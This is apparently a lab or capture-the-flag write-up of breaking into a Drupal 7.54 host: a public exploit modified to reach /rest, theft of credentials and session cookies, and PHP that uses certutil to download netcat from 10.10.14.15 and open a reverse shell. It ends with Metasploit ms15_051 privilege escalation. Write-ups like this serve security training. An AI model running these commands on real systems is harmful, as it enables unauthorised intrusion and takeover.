![[Pasted image 20231012143115.png]]

Heading to the webpage, we're met with Drupal
![[Pasted image 20231012143144.png]]

With some testing, and checking the robots.txt, we notice:
![[Pasted image 20231012143323.png]]

As we can see, we now know the exact version number of the CMS being used.
![[Pasted image 20231012143342.png]]

With some research "Drupal 7.54 exploit" we instantly are met with:
![[Pasted image 20231012144251.png]]

We used the exploit, but we had to alter some of the code:
Originally i only changed the url to the proper IP, and as we can see, the endpoint_path is set to /rest-endpoint, but the exploit doesn't work.
![[Pasted image 20231012144350.png]]

So if we try to access that endpoint ourselves, it turns out it doesnt exist for us.
![[Pasted image 20231012144445.png]]

What if we try just /rest? Because if we search up that error with drupal, we can see some stackoverflow questions, that show that /rest is also a possible endpoint.

With that fixed:
![[Pasted image 20231012144645.png]]

Now, the exploit is creating a .php file within the server, and the exploit code is retrieving credentials:
![[Pasted image 20231012144927.png]]

Also the session information:
![[Pasted image 20231012144951.png]]

So we can either log into the admin dashboard and investigate, or we can also change the data to maybe give us a shell of some sort, it'd have to be in php though.

Lets first try to add some of those cookies into our browser:
![[Pasted image 20231012151148.png]]

Here, we put the session names value into the name section, and the id into the value:
![[Pasted image 20231012151217.png]]

I was having trouble trying to get a rev shell with the exploit code, so we'll have to do it through Drupal.

Going to be following this:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal#rce

For this, it will only work for versions of Drupal before V8.

So, after a lot of research, and some PHP errors, I was able to use this code on the new page within the "Add-content" section:
```
<?php
$command = "certutil.exe -urlcache -f http://10.10.14.15:8080/nc64.exe nc64.exe";
$output = shell_exec($command);
echo $output;
?>
```

And then to execute it: (Turns out [shell_exec](https://stackoverflow.com/questions/11209509/using-php-to-execute-cmd-commands) is exactly what I needed in this case)
```
<?php
shell_exec('nc64.exe -e cmd 10.10.14.15 1234')
?>
```

Now that we had access to the machine, i uploaded a meterpreter executable so i can use metasploit.

Once that was done, i ran local_exploit_suggester on the target, and was given multiple exploits that the target seemed to be vulnerable to.

I tried multiple, however the one that worked was [ms15_051](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-051). Using the metasploit module for it, i just had to make sure the payload was set to windows/x64/meterpreter/reverse_tcp, stressing on the x64 as without it, it wouldnt work. Also made sure the target was set to Windows x64, and the original meterpreter session was migrated to an x64 process.

Pwned.

---
